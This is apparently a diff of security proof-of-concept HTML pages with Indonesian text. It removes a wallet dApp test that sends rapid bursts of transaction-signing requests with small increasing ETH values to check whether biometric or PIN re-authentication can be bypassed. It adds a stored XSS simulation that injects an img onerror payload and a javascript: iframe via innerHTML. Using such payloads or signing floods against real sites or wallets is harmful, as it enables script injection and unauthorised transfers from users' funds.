@@ -2,113 +2,21 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Biometric/PIN Bypass Test - dApp PoC</title>
-    <style>
-        body { font-family: Arial, sans-serif; padding: 20px; background: #0f0f23; color: #0f0; }
-        button { padding: 15px 25px; margin: 10px; font-size: 16px; background: #ff00aa; color: white; border: none; border-radius: 8px; cursor: pointer; }
-        button:hover { background: #ff33bb; }
-        #log { background: #111; padding: 15px; height: 400px; overflow-y: scroll; border: 1px solid #333; margin-top: 20px; white-space: pre-wrap; }
-        .warning { color: #ff0; }
-    </style>
+    <title>Stored Injection Simulation</title>
 </head>
 <body>
-    <h1>🔐 Biometric/PIN Bypass Testing</h1>
-    <p>Ini adalah halaman test untuk dApp Browser Wallet.</p>
+    <h1>Simulasi Stored HTML Injection</h1>
     
-    <button onclick="connectWallet()">1. Connect Wallet</button><br>
-    <button onclick="sendTransaction()">2. Kirim Transaksi (Normal)</button><br>
-    <button onclick="rapidSigningTest(20)" style="background:#f00;">3. RAPID SIGNING TEST (20 requests)</button><br>
-    <button onclick="rapidSigningTest(50)" style="background:#f00;">RAPID 50 Requests</button>
-
-    <div id="log"></div>
+    <div id="userContent"></div>
 
     <script>
-        const log = document.getElementById('log');
-
-        function logMessage(msg, type = 'info') {
-            const time = new Date().toLocaleTimeString();
-            log.innerHTML += `[${time}] ${type === 'warning' ? '⚠️ ' : ''}${msg}\n`;
-            log.scrollTop = log.scrollHeight;
-            console.log(msg);
-        }
-
-        async function connectWallet() {
-            if (!window.ethereum) {
-                logMessage("❌ No injected provider (window.ethereum) detected!", "warning");
-                return;
-            }
-            try {
-                logMessage("🔗 Meminta connect wallet...");
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                logMessage(`✅ Connected: ${accounts[0]}`, "success");
-            } catch (err) {
-                logMessage(`❌ Connect gagal: ${err.message}`, "warning");
-            }
-        }
-
-        async function sendTransaction() {
-            if (!window.ethereum) {
-                logMessage("❌ Provider tidak tersedia!", "warning");
-                return;
-            }
-            try {
-                logMessage("📤 Mengirim transaksi test...");
-                const tx = {
-                    to: "0x0000000000000000000000000000000000000000",
-                    value: "0x0", // 0 ETH
-                    data: "0x",
-                    gas: "0x5208"
-                };
-                const txHash = await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [tx]
-                });
-                logMessage(`✅ Transaction hash: ${txHash}`, "success");
-            } catch (err) {
-                logMessage(`❌ Signing ditolak / error: ${err.message}`, "warning");
-            }
-        }
-
-        async function rapidSigningTest(count = 20) {
-            logMessage(`🚀 Memulai RAPID SIGNING TEST (${count} requests)...`, "warning");
-            logMessage("Perhatikan apakah biometric/PIN hanya muncul sekali atau tidak muncul sama sekali.");
-
-            for (let i = 1; i <= count; i++) {
-                try {
-                    logMessage(`[${i}/${count}] Mengirim request signing...`);
-                    const tx = {
-                        to: "0x000000000000000000000000000000000000dead",
-                        value: "0x" + (i * 1000000000000000).toString(16), // small increasing value
-                        data: "0x",
-                        gas: "0x5208"
-                    };
-                    await window.ethereum.request({
-                        method: 'eth_sendTransaction',
-                        params: [tx]
-                    });
-                    logMessage(`[${i}] ✅ Berhasil tanpa re-auth!`, "success");
-                } catch (err) {
-                    logMessage(`[${i}] ❌ Ditolak: ${err.message}`);
-                    if (err.message.includes("User denied") || err.code === 4001) {
-                        logMessage("Wallet menolak massal — ini perilaku yang diharapkan jika aman.", "warning");
-                        break;
-                    }
-                }
-                // Delay kecil agar tidak terlalu brutal
-                await new Promise(r => setTimeout(r, 300));
-            }
-            logMessage("=== RAPID TEST SELESAI ===", "warning");
-        }
-
-        // Auto detect provider
-        window.addEventListener('load', () => {
-            if (window.ethereum) {
-                logMessage("✅ Provider terdeteksi (MetaMask / WalletConnect / Injected)");
-            } else {
-                logMessage("❌ Tidak ada injected provider. Buka di dApp Browser Wallet.", "warning");
-            }
-        });
+        // Simulasi data dari "server" / localStorage
+        const maliciousData = `
+            <h2 style="color:red">STORED INJECTION BERHASIL</h2>
+            <img src="x" onerror="alert('Stored XSS via onerror')">
+            <iframe src="javascript:alert('iframe injection')"></iframe>
+        `;
+        document.getElementById('userContent').innerHTML = maliciousData;
     </script>
 </body>
 </html>
